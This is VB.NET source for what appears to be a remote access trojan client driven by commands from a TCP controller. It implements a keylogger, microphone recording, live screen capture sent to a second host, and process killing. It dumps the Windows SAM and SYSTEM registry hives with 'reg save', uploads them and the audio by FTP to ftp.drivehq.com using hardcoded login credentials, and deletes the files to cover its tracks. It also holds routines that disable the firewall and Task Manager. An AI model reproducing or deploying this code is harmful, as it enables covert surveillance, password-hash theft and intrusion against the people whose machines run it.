Imports System.Net.Sockets
Imports System.IO
Imports System.Text
Imports System.Net.NetworkInformation
Imports System.Threading
'enable us work with window api
Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Imports System.Runtime.Serialization.Formatters.Binary

Public Class Form1
    Public TCPClient As New TcpClient
    Dim Client As New TcpClient
    Dim ns As NetworkStream
    Dim buffercat As String
    Dim data As String
    Dim buffer As New List(Of String)
    Dim dt() As String
    Dim Thread As System.Threading.Thread
    Dim Thread2 As System.Threading.Thread
    Dim stagingpoint As String
    Dim username As String
    Dim dt2 As String
    Dim actual As String
    Dim process As Process
    Dim information() As String

    Dim hostname As String
    Dim recording As Boolean = False
    Dim check_process_memory As String
    Dim NetStream As NetworkStream
    Dim thread_keylogger As Thread
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'minimize the form
        'Me.WindowState = FormWindowState.Minimized
        'hide it from the task bar
        'ShowInTaskbar = False
        'hide from alt+tab
        'Me.Visible = False
        'go to the  firewall method
        'firewall_disable()
        'go to the task manager method
        'taskmanager_disable()
        'connect the ip with sepcific port by using TCP
        TCPClient.Connect("127.0.0.1", 9000)
        'if the connection is established
        If TCPClient.Connected Then
            'get the network stream - use to send the infomriation
            NetStream = TCPClient.GetStream()
            'get all the computer information and save it to the dt (String) variable
            dt = get_informaton()
            'go to send data method
            send_data(dt)
            'start the timer
            Timer1.Enabled = True
        End If

    End Sub

    Private Sub keylog()
        Dim key As Integer
        While True
            'it is use to check the key state, the captured key state will present in number so
            For key = 1 To 93
                'if the key is valid
                If getkey(key) Then
                    'add to the buffer
                    AddtoBuffer(key, getkey(16))
                End If
            Next
            For key = 186 To 192
                If getkey(key) Then
                    AddtoBuffer(key, getkey(16))
                End If
            Next
            BufferToOutput()
            buffer.Clear()
            Thread.Sleep(120)
            'send the string 
            send_data(stagingpoint)
        End While
    End Sub
    'save all the buffer (string array) to the string
    Public Sub BufferToOutput()
        If buffer.Count <> 0 Then
            Dim qux As Integer = 0
            While qux < buffer.Count
                buffercat = buffercat & buffer(qux)
                qux += 1
            End While
            stagingpoint = stagingpoint & buffercat
            buffercat = String.Empty
        End If
    End Sub

    'determine the keycode
    Public Sub AddtoBuffer(ByVal foo As Integer, ByVal modifier As Boolean)
        If Not (foo = 1 Or foo = 2 Or foo = 8 Or foo = 9 Or foo = 13 Or (foo >= 17 And foo <= 20) Or foo = 27 Or (foo >= 32 And foo <= 40) Or (foo >= 44 And foo <= 57) Or (foo >= 65 And foo <= 93) Or (foo >= 186 And foo <= 192)) Then
            Exit Sub
        End If
        Select Case foo
            Case 48 To 57
                If modifier Then
                    Select Case foo
                        Case 48
                            actual = ")"
                        Case 49
                            actual = "!"
                        Case 50
                            actual = "@"
                        Case 51
                            actual = "#"
                        Case 52
                            actual = "$"
                        Case 53
                            actual = "%"
                        Case 54
                            actual = "^"
                        Case 55
                            actual = "&"
                        Case 56
                            actual = "*"
                        Case 57
                            actual = "("
                    End Select
                Else
                    actual = Convert.ToChar(foo)
                End If
            Case 65 To 90
                If modifier Then
                    actual = Convert.ToChar(foo)
                Else
                    actual = Convert.ToChar(foo + 32)
                End If
            Case 1
                'actual = "<LCLICK>"
                actual = ""
            Case 2
                actual = "<RCLICK>"
            Case 8
                actual = "<BACKSPACE>"
            Case 9
                actual = "<TAB>"
            Case 13
                actual = "<ENTER>"
            Case 17
                actual = "<CTRL>"
            Case 18
                actual = "<ALT>"
            Case 19
                actual = "<PAUSE>"
            Case 20
                actual = "<CAPSLOCK>"
            Case 27
                actual = "<ESC>"
            Case 32
                actual = " "
            Case 33
                actual = "<PAGEUP>"
            Case 34
                actual = "<PAGEDOWN>"
            Case 35
                actual = "<END>"
            Case 36
                actual = "<HOME>"
            Case 37
                actual = "<LEFT>"
            Case 38
                actual = "<UP>"
            Case 39
                actual = "<RIGHT>"
            Case 40
                actual = "<DOWN>"
            Case 44
                actual = "<PRNTSCRN>"
            Case 45
                actual = "<INSERT>"
            Case 46
                actual = "<DEL>"
            Case 47
                actual = "<HELP>"
            Case 186
                If modifier Then
                    actual = ":"
                Else
                    actual = ";"
                End If
                actual = ";"

            Case 187
                If modifier Then
                    actual = "+"
                Else
                    actual = "="
                End If
            Case 188
                If modifier Then
                    actual = "<"
                Else
                    actual = ","
                End If
            Case 189
                If modifier Then
                    actual = "_"
                Else
                    actual = "-"
                End If
            Case 190
                If modifier Then
                    actual = ">"
                Else
                    actual = "."
                End If
            Case 191
                If modifier Then
                    actual = "?"
                Else
                    actual = "/"
                End If
            Case 192
                If modifier Then
                    actual = "~"
                Else
                    actual = "`"
                End If
        End Select

        If buffer.Count <> 0 Then
            Dim bar As Integer = 0
            While bar < buffer.Count
                If buffer(bar) = actual Then
                    Exit Sub
                End If
                bar += 1
            End While
        End If

        'save the key pressed to the buffer (still in string, havent convert)
        buffer.Add(actual)
    End Sub


    Private Sub firewall_disable()
        'set a process value
        'network shell - use to control the operating system
        Dim psi As New ProcessStartInfo("netsh", "firewall set opmode disable")
        'hide the cmd
        psi.WindowStyle = ProcessWindowStyle.Hidden
        'start the process
        Process.Start(psi)
    End Sub

    Private Sub taskmanager_disable()
        Dim RegistryKey As Object
        'return a shell window object
        RegistryKey = CreateObject("Wscript.shell")
        'rewrite the registry to disable the task manager
        'HKEY_CURRENT_USER - contains configuration information for software
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")

    End Sub

    Public Function get_informaton() As String()
        Dim data() As String
        Dim os As String
        Dim macaddress As String
        Dim ipaddress As String
        Dim os_platform As String
        Dim os_version As String
        Dim total_pysicalmemory As String
        Dim total_virtualmemory As String
        Dim recording As Boolean = False

        'get username
        'My.User.CurrentPrincipal - get user info
        'Security.Principal.WindowsPrincipal - check group of window user
        If TypeOf My.User.CurrentPrincipal Is Security.Principal.WindowsPrincipal Then
            Dim break() As String = Split(My.User.Name, "\")
            username = break(1)
        Else
            username = My.User.Name
        End If
        'get hostname
        hostname = System.Net.Dns.GetHostName
        'get all the network interface information
        Dim nics() As NetworkInterface = NetworkInterface.GetAllNetworkInterfaces
        macaddress = nics(0).GetPhysicalAddress.ToString
        'retrieve IP
        'get the internal host address
        ipaddress = System.Net.Dns.GetHostEntry(hostname).AddressList(5).ToString
        'to retrieve OS
        os = My.Computer.Info.OSFullName
        'retrieve os platform
        os_platform = My.Computer.Info.OSPlatform
        'retrieve os version
        os_version = My.Computer.Info.OSVersion
        'get the physical memory
        total_pysicalmemory = System.Math.Round((My.Computer.Info.TotalPhysicalMemory / (1024 * 1024 * 1024)), 2).ToString() + "GB"
        'get the virtual memory
        total_virtualmemory = System.Math.Round((My.Computer.Info.TotalVirtualMemory / (1024 * 1024 * 1024)), 2).ToString() & "GB"
        data = {username, os, hostname, macaddress, ipaddress, os_platform, os_version, total_pysicalmemory, total_virtualmemory}
        get_informaton = data
        Return get_informaton
    End Function

    Private Sub send_data(info() As String)
        Dim processed As String
        'join all the data together
        processed = String.Join(";", info)
        'get the network stream of the tcp
        Dim Netstream As NetworkStream = TCPClient.GetStream()
        If Netstream.CanWrite Then
            'send data as byte
            Dim sendBytes As [Byte]() = Encoding.ASCII.GetBytes(processed)
            'wrte the data
            Netstream.Write(sendBytes, 0, sendBytes.Length)
        End If
    End Sub

    Private Sub send_data(info As String)
        Dim Netstream As NetworkStream = TCPClient.GetStream()
        If Netstream.CanWrite Then
            Dim sendBytes As [Byte]() = Encoding.ASCII.GetBytes(info)
            Netstream.Write(sendBytes, 0, sendBytes.Length)
        End If
        stagingpoint = ""
    End Sub

    Private Sub transfer_data()
        Dim fileStream As Stream
        fileStream = File.OpenRead("C:\Users\" + username + "\Documents\abc.wav")
        Dim send As Byte
        Dim writer As New BinaryWriter(fileStream)
        Do
            send = NetStream.ReadByte()
            writer.Write(send)

        Loop While NetStream.DataAvailable

    End Sub

    Public Sub sendFile()
        Dim strz As System.IO.Stream
        Dim request As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.drivehq.com/test.wav"), System.Net.FtpWebRequest)
        request.Credentials = New System.Net.NetworkCredential("watchdogscanner@gmail.com", "W@tchD0g_Scanner01172017")
        request.EnableSsl = True
        request.Method = System.Net.WebRequestMethods.Ftp.UploadFile
        Dim file() As Byte = System.IO.File.ReadAllBytes("C:\Users\" + username + "\Documents\abc.wav")
        strz = request.GetRequestStream()
        strz.Write(file, 0, file.Length)
        strz.Flush()
        strz.Close()
        strz.Dispose()
        My.Computer.FileSystem.DeleteFile("C:\Users\" + username + "\Documents\abc.wav")
    End Sub


    Private Function get_process() As String()
        Dim count As Integer = 0
        Dim position As Integer
        Dim process_position As Integer = 0
        'loop all the process
        For Each process In Process.GetProcesses
            'check whether the process is running in main window.  If yes, it means the process is not a background process
            If process.MainWindowTitle <> "" Then
                count += 1
            End If
        Next
        Dim pn(count * 2) As String
        count = 0
        'get the process position.
        For Each process In Process.GetProcesses
            If process.MainWindowTitle <> "" Then
                pn(count) = process.ProcessName
                count += 1
                pn(count) = process_position
                count += 1
            End If
            process_position += 1
        Next
        Return pn
    End Function
    Private Function get_background_process() As String()
        Dim pn(Process.GetProcesses.Length) As String
        Dim count As Integer = 0
        For Each process In Process.GetProcesses
            pn(count) = process.ProcessName
            count += 1
        Next
        Return pn
    End Function

    Private Function get_memory(ByVal gettheprocess As Integer) As String
        Dim pn As String = ""
        Dim count As Integer = 0
        For a As Integer = gettheprocess To gettheprocess

        Next
        For Each process In Process.GetProcesses
            If count = gettheprocess Then
                pn = ""
                'get the process memory usage
                pn = process.WorkingSet64 / 1024
                Exit For
            End If
            count += 1
        Next
        Return pn + "K"
    End Function

    'upload the sam file to the ftp 
    Public Sub extract_sam()
        'get the input output stream
        Dim strz As System.IO.Stream
        'create a ftprequest on the specific url
        Dim request As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.drivehq.com/sam"), System.Net.FtpWebRequest)
        'log in to theftp
        request.Credentials = New System.Net.NetworkCredential("watchdogscanner@gmail.com", "W@tchD0g_Scanner01172017")
        'enable the ssl protocol
        request.EnableSsl = True
        'desscribe the ftp request (upload/download)
        request.Method = System.Net.WebRequestMethods.Ftp.UploadFile
        'read all the byte of the file
        Dim file() As Byte = System.IO.File.ReadAllBytes("C:\sam")
        'request the stream of the ftp (use the send the data)
        strz = request.GetRequestStream()
        'write the data to the input output stream
        strz.Write(file, 0, file.Length)
        'flush all the data
        strz.Flush()
        'close the stream
        strz.Close()
        'release all the resource  in the stream
        strz.Dispose()
        'delete the file - clovering the track
        My.Computer.FileSystem.DeleteFile("C:\sam")
        ListBox1.Items.Add("sam uploaded")
    End Sub

    'upload the system file to the ftp
    Public Sub extract_system()
        Dim strz As System.IO.Stream
        Dim request As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.drivehq.com/system"), System.Net.FtpWebRequest)
        request.Credentials = New System.Net.NetworkCredential("watchdogscanner@gmail.com", "W@tchD0g_Scanner01172017")
        request.EnableSsl = True
        request.Method = System.Net.WebRequestMethods.Ftp.UploadFile
        Dim file() As Byte = System.IO.File.ReadAllBytes("C:\system")
        strz = request.GetRequestStream()
        strz.Write(file, 0, file.Length)
        strz.Flush()
        strz.Close()
        strz.Dispose()
        My.Computer.FileSystem.DeleteFile("C:\system")
        ListBox1.Items.Add("system uploaded")
    End Sub

    'start the timer (keep looping to check any incoming data)
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        'check if the network stream can read or not
        If NetStream.CanRead Then
            'check any incoming data
            If NetStream.DataAvailable Then
                Dim bytes(TCPClient.ReceiveBufferSize) As Byte
                'read the incoming data to the bytes (buffer to bytes)
                NetStream.Read(bytes, 0, CInt(TCPClient.ReceiveBufferSize))
                'change the bytes to ASCII (readable)
                data = Encoding.ASCII.GetString(bytes)
                ListBox1.Items.Add(data)
                'use to kill the victim process
                If Not data.Contains("Kill") And data.Contains("Task;") Then
                    'split the incoming data to the information array
                    information = data.Split(";")
                    'call the get memory method
                    dt2 = get_memory(information(1))
                    check_process_memory = dt2
                    'call the send data method
                    send_data(dt2)
                    If Not thread_keylogger Is Nothing Then
                        'check the thread of the keylogger whther is alive or not
                        If thread_keylogger.IsAlive Then
                            'stop the thread 
                            thread_keylogger.Abort()
                        End If
                    End If
                    Timer2.Enabled = True
                    'get the current running process
                ElseIf Not data.Contains("kill") And data.Contains("Task0") Then
                    If Not thread_keylogger Is Nothing Then
                        If thread_keylogger.IsAlive Then
                            thread_keylogger.Abort()
                        End If
                    End If
                    dt = get_process()
                    send_data(dt)
                    'get the background running process
                ElseIf Not data.Contains("kill") And data.Contains("Task1") Then
                    If Not thread_keylogger Is Nothing Then
                        If thread_keylogger.IsAlive Then
                            thread_keylogger.Abort()
                        End If
                    End If
                    dt = get_background_process()
                    send_data(dt)
                    'start remote the lapotp screen
                ElseIf data.Contains("remote") Then
                    Client.Connect("192.168.1.9", "9001")
                    Timer3.Start()
                    'start extract the sam and system file
                ElseIf data.Contains("sam") Then
                    'use shell to extract the sam file
                    Shell("reg save hklm\sam c:\sam", 0)
                    'use shell to extract the system file
                    Shell("reg save hklm\system c:\system", 0)
                    Thread.Sleep(1000)
                    'start the thread to start upload the sam file to ftp server
                    Thread = New System.Threading.Thread(AddressOf extract_sam)
                    Thread.Start()
                    'start the thread to start upload the system file to ftp server
                    Thread2 = New System.Threading.Thread(AddressOf extract_system)
                    Thread2.Start()
                    'start the keylogger
                ElseIf data.Contains("Key") Then
                    'start a thread of a specific function
                    thread_keylogger = New Thread(AddressOf keylog)
                    'run the thread in background
                    thread_keylogger.IsBackground = True
                    thread_keylogger.Start()
                    'use to stop the keylogger thread
                ElseIf data.Contains("1") Then
                    If Not thread_keylogger Is Nothing Then
                        If thread_keylogger.IsAlive Then
                            thread_keylogger.Abort()
                        End If
                    End If
                    'use to stop sound recorder
                ElseIf data.Contains("stop") Then
                    'stop capture the sound
                    mciSendStringW("stop capture", sb, 0, IntPtr.Zero)
                    'file path 
                    Dim saveas As String = Chr(34) & "C:\Users\" + username + "\Documents\abc.wav" & Chr(34)
                    'save the sound to the file path
                    mciSendStringW("save capture " & saveas, Nothing, 0, IntPtr.Zero)
                    'close the sound recorder
                    mciSendStringW("close capture", sb, 0, IntPtr.Zero)
                    'start send file method
                    sendFile()
                    'use to start sound recorder
                ElseIf data.Contains("record") Then
                    'open the recorder
                    mciSendStringW("open new Type waveaudio Alias capture", sb, 0, IntPtr.Zero)
                    'set the sound format
                    mciSendStringW("set capture time format ms bitspersample 16 channels 2 samplespersec 48000 bytespersec 192000 alignment 4", Nothing, 0, IntPtr.Zero)
                    'start capture the sound
                    mciSendStringW("record capture", Nothing, 0, IntPtr.Zero)
                    'use to kill the process
                ElseIf data.Contains("Kill") Then
                    If Not thread_keylogger Is Nothing Then
                        If thread_keylogger.IsAlive Then
                            thread_keylogger.Abort()
                        End If
                    End If
                    Timer2.Enabled = False
                    information = data.Split(";")
                    'get the process name
                    Dim proc = Process.GetProcessesByName(information(information.Length - 2))
                    For check As Integer = 0 To proc.Count - 1
                        'close the target process
                        If Not proc(check).WaitForExit(1000) Then
                            'if the process is exited
                            If Not proc(check).HasExited Then
                                'close the process
                                proc(check).Kill()
                            End If
                        End If
                    Next
                    check_process_memory = ""
                End If
            End If
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If information(0).Equals("Task") Then
            dt2 = get_memory(information(1))
            If Not dt2.Equals(check_process_memory) Then
                check_process_memory = dt2
                send_data(dt2)
            End If
        End If

    End Sub

    'determine the key is presssed
    'Alias - name of the function of the library
    Public Declare Function GetAsyncKeyState Lib "user32" _
      Alias "GetAsyncKeyState" (ByVal vKey As Integer) _
      As Integer

    <DllImport("winmm.dll", EntryPoint:="mciSendStringW")>
    Private Shared Function mciSendStringW(<MarshalAs(UnmanagedType.LPWStr)> ByVal lpstrCommand As String, <MarshalAs(UnmanagedType.LPWStr)> ByVal lpstrReturnString As StringBuilder, ByVal uReturnLength As Integer, ByVal hwndCallback As IntPtr) As Integer
    End Function
    Private sb As New StringBuilder

    'import the user32.dll in to the project
    'getasynckeystate - is a function that used to capture the pressed key on the keyboard
    'pass the key to the getkey method
    <DllImport("USER32.DLL", EntryPoint:="GetAsyncKeyState", SetLastError:=True,
    CharSet:=CharSet.Unicode, ExactSpelling:=True,
    CallingConvention:=CallingConvention.StdCall)>
    Public Shared Function getkey(ByVal Vkey As Integer) As Boolean
    End Function

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        SendDesktop()
    End Sub

    Private Sub SendDesktop()
        Dim bf As New BinaryFormatter
        ns = Client.GetStream
        'serialize the screen and send to the attacker
        bf.Serialize(ns, Desktop())
    End Sub

    'capture the screen image
    Public Function Desktop() As Image
        'represent a size of integer
        Dim bounds As Rectangle = Nothing
        'image
        Dim screenshot As System.Drawing.Bitmap = Nothing
        'for drawing
        Dim graph As Graphics = Nothing
        'get the bounds of the primary screen
        bounds = Screen.PrimaryScreen.Bounds
        'capture the  screen
        screenshot = New Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
        'draw the graphic
        graph = Graphics.FromImage(screenshot)
        'copy the rectangle of the screen
        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
        'return the capture screen
        Return screenshot
    End Function


End Class
